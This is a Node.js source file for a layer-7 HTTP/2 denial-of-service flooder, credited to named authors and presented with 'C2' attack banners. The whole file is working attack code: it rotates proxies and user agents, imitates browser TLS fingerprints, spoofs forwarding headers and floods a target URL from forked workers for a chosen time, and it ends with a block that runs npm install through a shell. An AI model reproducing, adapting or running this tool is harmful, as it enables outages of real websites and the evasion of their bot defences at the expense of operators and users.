/**
 * Layer7 By Hanggar And Iqbal
 */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const child_process = require('child_process');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node bomb.js URL TIME REQ_PER_SEC THREADS\nExample: node bomb.js https://www.smk.dev/ 500 8 1`);
    process.exit();
}

// Configuration for TLS
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

// Read proxy and user-agent files asynchronously
const readLines = (filePath) => fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);

const proxyFile = path.resolve(__dirname, "proxy.txt");
const proxies = readLines(proxyFile);
const userAgents = readLines(path.resolve(__dirname, "ua.txt"));

// Argument parsing and validation
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5])
};

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`Raditya C2\n`);
    console.log(`[Broadcast] Attack initiated successfully\n`);
    console.log(`[Broadcast] Target: ${parsedTarget.host}`);
    console.log(`[Broadcast] Duration: ${args.time} seconds`);
    console.log(`[Broadcast] Threads: ${args.threads}`);
    console.log(`[Broadcast] Requests per second: ${args.rate}`);
    console.log(`[Broadcast] Status: Success!\n`);

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);
} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0);
    }
}

class NetSocket {
    HTTP(options, callback) {
        const addrHost = options.address.split(":")[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, `error: ${error}`);
        });
    }
}

const Socker = new NetSocket();

const randomIntn = (min, max) => Math.floor(Math.random() * (max - min) + min);

const randomElement = (elements) => elements[randomIntn(0, elements.length)];

const headers = {
    ":method": "GET",
    ":path": parsedTarget.path,
    ":scheme": "https",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "cache-control": "no-cache",
    "upgrade-insecure-requests": "1"
};

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = randomElement(userAgents);
    headers["x-forwarded-for"] = parsedProxy[0];

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const intervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    headers["referer"] = `https://${parsedTarget.host}${parsedTarget.path}`;
                    const request = client.request(headers);

                    request.on("response", (response) => {
                        request.close();
                        request.destroy();
                    });

                    request.on("error", (err) => {
                        request.close();
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);

            setTimeout(() => {
                clearInterval(intervalAttack);
                client.close();
            }, args.time * 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", (error) => {
            client.destroy();
            connection.destroy();
        });
    });
}

const killScript = () => process.exit(1);

setTimeout(killScript, args.time * 1000);

process.on("uncaughtException", (error) => {
    console.error("Uncaught Exception:", error);
});

process.on("unhandledRejection", (error) => {
    console.error("Unhandled Rejection:", error);
});

// Automatic installation of required modules
const scriptFilePath = path.resolve(__dirname, 'contoh.js'); // Update this to your script file path

fs.readFile(scriptFilePath, 'utf8', (err, data) => {
    if (err) {
        console.error(`Failed to read file ${scriptFilePath}: ${err}`);
        process.exit(1);
    }

    const requiredModules = data.match(/require\s*\(\s*['"]([^'"]+)['"]\s*\)/g);

    if (!requiredModules) {
        console.log('No modules required in the script.');
        process.exit(0);
    }

    const moduleNames = requiredModules.map((requireStatement) => {
        return requireStatement.match(/require\s*\(\s*['"]([^'"]+)['"]\s*\)/)[1];
    });

    if (moduleNames.length > 0) {
        console.log(`Installing modules: ${moduleNames.join(', ')}`);

        const installCommand = `npm install ${moduleNames.join(' ')}`;
        const installationProcess = child_process.spawnSync(installCommand, { shell: true, stdio: 'inherit' });

        if (installationProcess.status === 0) {
            console.log('Modules installed successfully.');
        } else {
            console.error('Failed to install modules.');
        }
    } else {
        console.log('No modules found in the script.');
    }
});